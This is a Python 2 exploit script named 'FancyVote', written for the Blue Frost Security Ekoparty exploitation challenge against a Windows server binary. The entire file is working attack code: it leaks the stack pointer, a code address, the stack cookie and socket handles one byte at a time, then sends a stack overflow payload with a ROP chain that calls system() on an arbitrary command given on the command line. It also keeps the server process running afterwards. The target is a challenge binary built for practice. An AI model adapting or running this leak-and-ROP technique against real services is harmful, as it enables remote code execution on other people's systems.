#!/usr/bin/env python


# FancyVote
# ---------
# Exploit for BFS Ekoparty Exploitation Challenge
#
# author: Dennis Elser
#
# tested and confirmed working on Win7 x64 and win10 x64
# https://labs.bluefrostsecurity.de/blog/2017/08/02/bfs-ekoparty-exploitation-challenge/
# bfs.exe C796B7BAB7789DB42BAF9E8BFCFB697F03E74662E7CDAAFE7D0D3D2D471E05B0

# history:
# * 2017-08-03 - initial version
# * 2017-08-05 - process continuation cofirmed to work on win7 and win10
# * 2017-08-06 - fine-tuning of process continuation
# * 2017-08-07 - cmd line argument "--apt": apt/attribution/memory forensics mode
#                cmd line argument "--exit": force server to exit after exploitation
#                cmd line argument "--port": specify TCP port
   
import socket
import struct
import argparse
import time

IP = ""
TCP_PORT = 55555
BUFFER_SIZE = 4096

OPT_SIGNATURE = ""
OPT_FORCE_EXIT = False

# OFFS_ vars are relative to frame ptr + 0x40
OFFS_CODE = 0x28 # _write()+AE
OFFS_STACK = 0xC0
OFFS_COOKIE = 0x100
OFFS_SOCKHANDLES = 0x120

# DELTA_ vars are relative to leaked address of write()+0xAE
DELTA_SYSTEM = 0x9A5A # system()+0
DELTA_RETMAIN = 0x9AA2 # main()+1E0
DELTA_EXIT_EAX = 0x939D # __tmainCRTStartup()+0x145
DELTA_CALLIND = 0x9DFA # sub_13F721280()+0x118
DELTA_POP_RAX = 0x9FE7 # sub_13F9610F0()+0xBB
DELTA_XCHG_EAX_ESP = 0x99EF # system()+0x6B
DELTA_POP_RDI = 0x96D6 # malloc()+0xB4
DELTA_MOV_RDI_IND_RAX_CALL_EBX = 0x8422 # doexit()+0xC8
DELTA_POP_RBX = 0x978F # free()+0x3B

SIZE_QUAD = struct.calcsize("Q")
SIZE_FRAME_VULNFUNC = 0x158 + SIZE_QUAD


def leak_q(offs, cookie=None, ret=None, csock=None):
  """exploits bug in server that leaks one byte per response"""

  global IP
  global TCP_PORT
  global BUFFER_SIZE
  global SIZE_QUAD
  global OFFS_COOKIE

  msg = "Hello\x00"
  s = None

  start = offs
  end = offs + SIZE_QUAD
  size = end - start

  leaked = 2 * struct.pack("<Q", 0)
  if cookie is not None and ret is not None:
    leaked += ((OFFS_COOKIE - len(leaked)) * "L" +
      struct.pack("<Q", cookie) +
      2 * struct.pack("<Q", 0) +
      struct.pack("<Q", ret))

    if csock is not None:
      leaked += struct.pack("<Q", csock)

  leaked += (offs - len(leaked)) * "L"

  for i in xrange(SIZE_QUAD):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, TCP_PORT))
    s.send(msg)
    data = s.recv(BUFFER_SIZE)
    if data == "Hi\x00":
      payload = leaked
      s.send(struct.pack("<H", len(payload)) + "\x66\x00")
      s.send(payload)

      data = s.recv(BUFFER_SIZE)
      
      if len(data):
        leaked += data[len(data)-1]
      else:
        if s is not None:
          s.close()
        return 0

    s.close()

  assert(len(leaked) == offs + SIZE_QUAD)

  return struct.unpack("<Q", leaked[len(leaked)-SIZE_QUAD:])[0]


def pwn(magic, cookie, rip, rsp, cmdline, c_sock=0, s_sock=0):
  """exploits stack based buffer overflow caused by unchecked memcpy()"""

  global IP
  global TCP_PORT
  global BUFFER_SIZE
  global SIZE_QUAD
  global SIZE_FRAME_VULNFUNC
  global OFFS_COOKIE
  global DELTA_CALLIND
  global DELTA_SYSTEM
  global DELTA_RETMAIN
  global DELTA_EXIT_EAX
  global DELTA_POP_RAX
  global DELTA_XCHG_EAX_ESP
  global DELTA_POP_RDI
  global DELTA_MOV_RDI_IND_RAX_CALL_EBX
  global DELTA_POP_RBX
  global OPT_SIGNATURE
  global OPT_FORCE_EXIT

  rspmain = rsp + SIZE_FRAME_VULNFUNC
  sig = OPT_SIGNATURE[:OFFS_COOKIE] # truncate
  try:
    msg = "Hello\x00"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, TCP_PORT))
    s.send(msg)
    data = s.recv(BUFFER_SIZE)
    cmd = cmdline + "\x00"
    if data == "Hi\x00":
      payload = (sig + (OFFS_COOKIE - len(sig)) * 'X' +
        struct.pack("<Q", cookie) +
        2 * struct.pack("<Q", 0) +
        struct.pack("<Q", rip-DELTA_CALLIND) +
        4 * struct.pack("<Q", 0) +
        struct.pack("<Q", s_sock) +
        struct.pack("<Q", rip-DELTA_SYSTEM) +
        struct.pack("<Q", len(cmdline)) +
        1 * struct.pack("<Q", 0) +
        cmd +
        sig[:OFFS_COOKIE - len(cmd)] +
        (OFFS_COOKIE - len(cmd) - len(sig[:OFFS_COOKIE - len(cmd)])) * 'X' +
        struct.pack("<Q", magic) +
        2 * struct.pack("<Q", 0))

      if not OPT_FORCE_EXIT and type(rsp) == long and (rsp & 0xFFFFFFFF00000000L):
        """fixing of 64bit-wide rsp currently not supported
           due to a 32bit SP used in a gadget (xchg eax, esp)
           if that is the case: process continuation will be unstable
           -> expoitation works for a limited number of times only
        """

        payload += struct.pack("<Q", rip-DELTA_RETMAIN)
        if c_sock and s_sock:
          payload += (struct.pack("<Q", c_sock) +
            3 * struct.pack("<Q", 0) +
            struct.pack("<Q", s_sock) +
            0x207 * struct.pack("<Q", 0) +
            struct.pack("<Q", c_sock))

      else:
        if OPT_FORCE_EXIT: # force server to exit
          payload += struct.pack("<Q", rip-DELTA_EXIT_EAX)
        else: # process continuation, fix RSP
          payload += (struct.pack("<Q", rip-DELTA_POP_RDI) + 
          struct.pack("<Q", rspmain-SIZE_QUAD) +
          struct.pack("<Q", rip-DELTA_POP_RAX) +
          struct.pack("<Q", rip-DELTA_RETMAIN) +
          struct.pack("<Q", rip-DELTA_POP_RBX) +
          struct.pack("<Q", rip-DELTA_POP_RAX) +
          struct.pack("<Q", rip-DELTA_MOV_RDI_IND_RAX_CALL_EBX) +
          struct.pack("<Q", rip-DELTA_POP_RAX) +
          struct.pack("<Q", rspmain-SIZE_QUAD) + 
          struct.pack("<Q", rip-DELTA_XCHG_EAX_ESP))

      s.send(struct.pack("<H", len(payload)) + "\x66\x00")
      s.send(payload)

    s.close()
  except:
    if s is not None:
      s.close()
      return False
  return True


def fancyvote(cmd):
  """leaks data from server, sets up data and invokes the exploit"""

  global SIZE_FRAME_VULNFUNC
  global OFFS_CODE
  global OFFS_STACK
  global OFFS_COOKIE
  global OFFS_SOCKHANDLES
  global IP
  global TCP_PORT
  global OPT_FORCE_EXIT

  csock = ssock = 0

  print "FancyVote\n---------\n" 
  print "[+] connecting to %s:%d" % (IP, TCP_PORT)
  
  rsp = leak_q(OFFS_STACK)
  print "[+] rsp at: %X" % rsp
  
  if type(rsp) == long and (rsp & 0xFFFFFFFF00000000L):
    action = raw_input("[?] process continuation not guaranteed. <c>ontinue <a>bort: ")
    if action != "c":
      print "[x] aborted"
      return

  rip = leak_q(OFFS_CODE)
  print "[+] _write()+0xAE at: %X" % rip
  
  cookie = leak_q(OFFS_COOKIE)
  print "[+] stack cookie is: %X" % cookie

  rsp -= 0x168
  xorkey = rsp ^ cookie
  newcookie = (rsp+SIZE_FRAME_VULNFUNC) ^ xorkey
  
  print "[+] system() at: %X" % (rip - DELTA_SYSTEM) 
  print "[+] xorkey is: %X" % xorkey  
  print "[+] newcookie is: %X" % newcookie

  if not OPT_FORCE_EXIT:
    print "[+] attempting to leak socket handles..."
    """process continuation depends on the ability to leak
       certain socket handles. however, leaking those is
       unreliable since they are invalidated by the server's main() function.
       it still happens to work quite reliably on win7 since the socket
       handles do not frequently change. win10 systems can be hammered
       until the socket handles are leaked successfully.
    """
    attempts = 3
    for i in xrange(attempts):
      time.sleep(1)
      csock = leak_q(OFFS_SOCKHANDLES, cookie, rip-DELTA_RETMAIN)
      ssock = leak_q(OFFS_SOCKHANDLES+0x20, cookie, rip-DELTA_RETMAIN, csock)
      cont = csock and ssock
      if cont:
        break
      print "[!] retrying... [%d/%d]" % (i+1, attempts)

    while not cont:
      print "[!] failure! server continuation not possible"
      try:
        action = raw_input("[?] retry? (noisy! hammers server..) <r>etry <i>gnore <a>bort: ")
        if action == "r":
          print "[+] hammering in progress... (ctrl-c aborts)"
          while True:
            csock = leak_q(OFFS_SOCKHANDLES, cookie, rip-DELTA_RETMAIN)
            ssock = leak_q(OFFS_SOCKHANDLES+0x20, cookie, rip-DELTA_RETMAIN, csock)
            cont = csock and ssock
            if cont:
              break
        elif action == "i":
          OPT_FORCE_EXIT = True
          break
        elif action == "a":
          print "[x] aborted"
          return
      except KeyboardInterrupt:
        pass

    if cont:
      print "[+] success! server continuation possible"

  print "[+] compromising voting machine..."

  success = pwn(newcookie, cookie, rip, rsp, cmd, c_sock=csock, s_sock=ssock)
  print "[+] success :]" if success else "[!] failure :["


# -------------- main -------------- #
if __name__ == "__main__":
  parser = argparse.ArgumentParser(description=(
    "FancyVote - Exploit for BFS Ekoparty Exploitation Challenge"))
  parser.add_argument("ip",
    help="target IP address")
  parser.add_argument("cmd",
    help="windows shell command, such as \"start /b calc\"")
  parser.add_argument("-p","--port",
    help="server port (default: %d)" % TCP_PORT, type=int, default = TCP_PORT)
  parser.add_argument("-e", "--exit",
    help="Force server to exit after successful exploitation.", action="store_true")
  parser.add_argument("-a", "--apt",
    help=("Attribution : APT signature of choice goes here." +
    "Up to %d characters to be put into the target address space") % OFFS_COOKIE)
  args = parser.parse_args()

  IP = args.apt
  TCP_PORT = args.port
  IP = args.ip
  OPT_FORCE_EXIT = args.exit

  try:
    fancyvote(args.cmd)
  except:
    print "[!] error"